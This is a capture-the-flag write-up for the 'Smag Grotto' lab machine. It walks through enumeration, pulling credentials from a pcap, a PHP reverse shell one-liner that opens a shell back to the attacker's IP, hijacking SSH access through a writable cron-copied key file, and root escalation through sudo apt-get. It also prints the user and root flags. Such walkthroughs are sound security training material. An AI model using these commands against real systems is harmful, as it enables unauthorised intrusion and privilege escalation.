# Smag Grotto

Do you remember how to analyse packets?

# What is the user flag?

## Services Enumeration

Let's start by enumerating the services with Nmap. We discover that SSH is running on port `22/tcp` and apache is running on port `80/tcp`.

~~~
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 74:e0:e1:b4:05:85:6a:15:68:7e:16:da:f2:c7:6b:ee (RSA)
|   256 bd:43:62:b9:a1:86:51:36:f8:c7:df:f9:0f:63:8f:a3 (ECDSA)
|_  256 f9:e7:da:07:8f:10:af:97:0b:32:87:c9:32:d7:1b:76 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Smag
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
~~~

## Web

There is no `robots.txt` file, but using Gobuster, we discover a hidden location: `/mail`.

~~~
kali@kali:/data/Smag_Grotto$ gobuster dir -u http://10.10.107.212 -w /usr/share/wordlists/dirb/common.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.107.212
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/08/29 12:35:02 Starting gobuster
===============================================================
/.hta (Status: 403)
/.htpasswd (Status: 403)
/.htaccess (Status: 403)
/index.php (Status: 200)
/mail (Status: 301)
/server-status (Status: 403)
===============================================================
2020/08/29 12:35:31 Finished
===============================================================
~~~

We are shown with a list of 3 emails in a web page, 1 of which contains an attached `*.pcap` file: http://10.10.107.212/aW1wb3J0YW50/dHJhY2Uy.pcap

## pcap file

We open the pcap in Wireshark. The network capture file only contains 10 frames and we immediately see the `POST` request to `/login.php` at frame 4. Right click on it and follow the HTTP stream to reveal the following information:

~~~
POST /login.php HTTP/1.1
Host: development.smag.thm
User-Agent: curl/7.47.0
Accept: */*
Content-Length: 39
Content-Type: application/x-www-form-urlencoded

username=helpdesk&password=cH4nG3M3_n0wHTTP/1.1 200 OK
Date: Wed, 03 Jun 2020 18:04:07 GMT
Server: Apache/2.4.18 (Ubuntu)
Content-Length: 0
Content-Type: text/html; charset=UTF-8
~~~

## Virtual host

The request is sent to the `development.smag.thm` domain, which is likely a virtual host that we will need to add to our `hosts` file. We are also provided with credentials.

Let's add the virtual host to our `/etc/hosts` file:

~~~
10.10.107.212	development.smag.thm
~~~

Now, connect to http://development.smag.thm and authenticate with `helpdesk:cH4nG3M3_n0w`. We are redirected to http://development.smag.thm/admin.php where we can now execute commands.

## Reverse shell

Start a listener:

~~~
$ rlwrap nc -nlvp 4444
~~~

And Send following command to the web form:

~~~
php -r '$sock=fsockopen("10.8.50.72",4444);exec("/bin/bash -i <&3 >&3 2>&3");'
~~~

We now have a reverse shell:

~~~
listening on [any] 4444 ...
connect to [10.8.50.72] from (UNKNOWN) [10.10.107.212] 49492
/bin/sh: 0: can't access tty; job control turned off
$ SHELL=/bin/bash script -q /dev/null
~~~

Listing the content of the `/home` folder reveals a user named `jake`. Unfortunately, the user flag in this folder is only accessible by `jake`.

~~~
www-data@smag:/var/www/development.smag.thm$ cd /home
cd /home
www-data@smag:/home$ ls -la
ls -la
total 12
drwxr-xr-x  3 root root 4096 Jun  4 11:37 .
drwxr-xr-x 22 root root 4096 Jun  4 11:35 ..
drwxr-xr-x  4 jake jake 4096 Jun  5 11:05 jake
www-data@smag:/home$ cd jake
cd jake
www-data@smag:/home/jake$ ls -la
ls -la
total 60
drwxr-xr-x 4 jake jake 4096 Jun  5 11:05 .
drwxr-xr-x 3 root root 4096 Jun  4 11:37 ..
-rw------- 1 jake jake  490 Jun  5 11:05 .bash_history
-rw-r--r-- 1 jake jake  220 Jun  4 11:37 .bash_logout
-rw-r--r-- 1 jake jake 3771 Jun  4 15:12 .bashrc
drwx------ 2 jake jake 4096 Jun  4 11:39 .cache
-rw------- 1 root root   28 Jun  5 11:05 .lesshst
-rw-r--r-- 1 jake jake  655 Jun  4 11:37 .profile
-rw-r--r-- 1 root root   75 Jun  4 15:53 .selected_editor
drwx------ 2 jake jake 4096 Jun  4 15:27 .ssh
-rw-r--r-- 1 jake jake    0 Jun  4 11:45 .sudo_as_admin_successful
-rw------- 1 jake jake 9336 Jun  5 11:05 .viminfo
-rw-r--r-- 1 root root  167 Jun  5 09:29 .wget-hsts
-rw-rw---- 1 jake jake   33 Jun  4 13:02 user.txt
www-data@smag:/home/jake$ cat user.txt
cat user.txt
cat: user.txt: Permission denied
~~~

## Lateral move

We obviously need to switch to `jake`. Let's check if there are interesting scheduled tasks:

~~~
www-data@smag:/home/jake$ cat /etc/crontab
cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*  *    * * *   root	/bin/cat /opt/.backups/jake_id_rsa.pub.backup > /home/jake/.ssh/authorized_keys
#
~~~

The last cronjob seems promising as it copies the content of a SSH public key to jake's `authorized_keys`. Moreover, the copied file is world-writable:

~~~
www-data@smag:/opt/.backups$ ls -l /opt/.backups/jake_id_rsa.pub.backup
ls -l /opt/.backups/jake_id_rsa.pub.backup
-rw-rw-rw- 1 root root 563 Jun  5 09:25 /opt/.backups/jake_id_rsa.pub.backup
~~~

Let's add our own public key (use `ssh-keygen -t rsa` to generate your own):

~~~
www-data@smag:/opt/.backups$ echo "ssh-rsa AAAAB3NzaC[REDACTED]+m7pk= kali@kali" > /opt/.backups/jake_id_rsa.pub.backup
~~~

Wait 1 minute and connect as jake without password:

~~~
kali@kali:/data/vpn$ ssh jake@10.10.107.212
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-142-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

Last login: Fri Jun  5 10:15:15 2020
jake@smag:~$ 
~~~

## User flag

From here, we eventually get the user flag:

~~~
jake@smag:~$ cat user.txt 
iusGorV7EbmxM5AuIe2w499msaSuqU3j
~~~

# What is the root flag?

## Privilege escalation

Jake can run `apt-get` as `root` without password:

~~~
jake@smag:~$ sudo -l
Matching Defaults entries for jake on smag:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jake may run the following commands on smag:
    (ALL : ALL) NOPASSWD: /usr/bin/apt-get
~~~

Checking on [GTFOBins](https://gtfobins.github.io/gtfobins/apt-get/) reveals that we can take advantage of this to run a privileged shell:

~~~
jake@smag:~$ sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/bash
root@smag:/tmp# whoami
root
~~~

## Root flag

Let's get the root flag:

~~~
root@smag:/tmp# cd /root
root@smag:/root# ls -l
total 4
-rw-rw---- 1 root root 33 Jun  4 13:04 root.txt
root@smag:/root# cat root.txt
uJr6zRgetaniyHVRqqL58uRasybBKz2T
~~~